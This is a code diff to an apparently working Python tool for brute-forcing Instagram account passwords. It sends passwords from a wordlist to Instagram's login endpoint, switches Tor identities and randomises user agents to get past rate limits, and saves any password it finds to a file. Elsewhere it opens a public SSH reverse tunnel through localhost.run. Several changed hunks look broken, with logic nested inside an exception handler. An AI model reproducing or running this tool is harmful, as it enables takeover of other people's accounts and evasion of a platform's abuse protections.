@@ -228,7 +228,7 @@ filepath = os.path.isfile(fileisd)
 
 if filepath == True:
 	filetor = open(fileisd,"w")
-	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
+	filetor.writelines("ControlPort 9876\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
 else:
@@ -236,7 +236,7 @@ else:
 	os.system(f"mkdir {fileisd[:-5]}")
 	Path(fileisd).touch()
 	filetor = open(fileisd,"a")
-	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
+	filetor.writelines("ControlPort 9876\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
 import urllib
@@ -504,7 +504,7 @@ def startServicea(folder,port):
     except Exception as e:
         link = ""
         pass
-    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\" && rm ok.txt"""
+    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\." && rm ok.txt"""
     try:
         oo = subprocess.check_output(command,shell=True)
         link2 = (str(oo.decode())[:-1])
@@ -624,24 +624,17 @@ import requests
 from stem.control import Controller
 from stem import Signal
 
-def get_tor_session():
-    session = requests.Session()
-    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
-    return session
 
 def renew_connection():
-    with Controller.from_port(port=9051) as c:
+    with Controller.from_port(port=9876) as c:
         c.authenticate()
         c.signal(Signal.NEWNYM)
 url = 'https://www.instagram.com/accounts/login/ajax/'
 import random
 	
 def signin(password,username):
-
-        
-         user=ua.random
-		  
-         headers = {
+    user=ua.random
+    headers = {
      'accept': '*/*',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -660,73 +653,50 @@ def signin(password,username):
     'x-instagram-ajax': 'bc3d5af829ea',
     'x-requested-with': 'XMLHttpRequest'
     }
-
-
-         data = {'username': f'{username}',
+    data = {'username': f'{username}',
          'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
          'queryParams': '{}',
          'optIntoOneTap': 'false'}
-         por = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
-         ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
-         por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
-
-         print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
-         renew_connection()
-         s = get_tor_session()
-         ipc = requests.get("https://httpbin.org/ip").json()['origin']
-         print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
-         ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
-         print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
-         print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")
-
-         try:
-         	r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
-         except Exception as e:
+    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
+    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
+    por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
+    print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
+    ipc = requests.get("https://httpbin.org/ip").json()['origin']
+    print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
+    renew_connection()
+    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
+    print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
+    print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")
+    try:
+        r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
+    except Exception as e:
+        print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
+        signin(password,username)
+        print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
+        try:
+            print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
+        except KeyError:
+            pass
+        if r.json()['status'] == "fail":
             print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
             signin(password,username)
-         print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
-         try:
-         	print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
-         except KeyError:
-         	pass
-         if r.json()['status'] == "fail":
-         	print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
-         	signin(password,username)
-         	pass
-         else:
-         	pass
-         
-         
-         if  'authenticated":true' in r.text or 'userId' in r.text:
-         	rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
-         	print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
-         	print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
-         	strtxt = username+".igfreak"
-         	filepass = open(strtxt,"w")
-         	filepass.writelines(f"Username : {username}\nPassword : {password}")
-         	filepass.close()
-         	print()
-         	head(f"Saved as : {strtxt}")
-         	end = timer()
-         	print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	    
-         	s = rs.Session()
-         	s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
-         	return sys.exit(456)
-         else:
-         	pass
-         	return False
+            pass
+        else:
+            pass
+        if  'authenticated":true' in r.text or 'userId' in r.text:
+            rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
+            print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
+            print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
+            strtxt = username+".igfreak"
+            filepass = open(strtxt,"w")
+            filepass.writelines(f"Username : {username}\nPassword : {password}")
+            filepass.close()
+            print()
+            head(f"Saved as : {strtxt}")    
+            return True
+        else:
+            return False
 
-
-
-def changeip():
-	s = get_tor_session()
-	ipc = requests.get("https://httpbin.org/ip").json()['origin']
-	print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
-	renew_connection()
-	s = get_tor_session()
-	por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
-	ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
-	print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
 
 def head(str):
 	print(R+"["+G+">"+R+"] "+C+str)
@@ -737,14 +707,14 @@ def Bruteforce(passlist,username):
 
 	with open(passlist, 'rb') as file:
 	           for line in file:
-	               for n,word in enumerate(line.split()):
+	               for word in line.split():
 	                   		print("\n")
-	                   		print(f"{Y}[{W}n/{str(n_words)}{Y}]{C} Testing password : {G}"+word.decode())  
+	                   		print(f"{Y}[{W}{line.split().index(word)+1}/{n_words}{Y}]{C} Testing password : {G}"+word.decode())  
 	                   		trial = signin(word.decode(),username)
 	                   		if trial == True:
 	                   			end = timer()
 	                   			print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
-	                   			sys.exit(1)
+	                   			sys.exit()
 	                   		else:
 	                   			continue
 	end = timer()
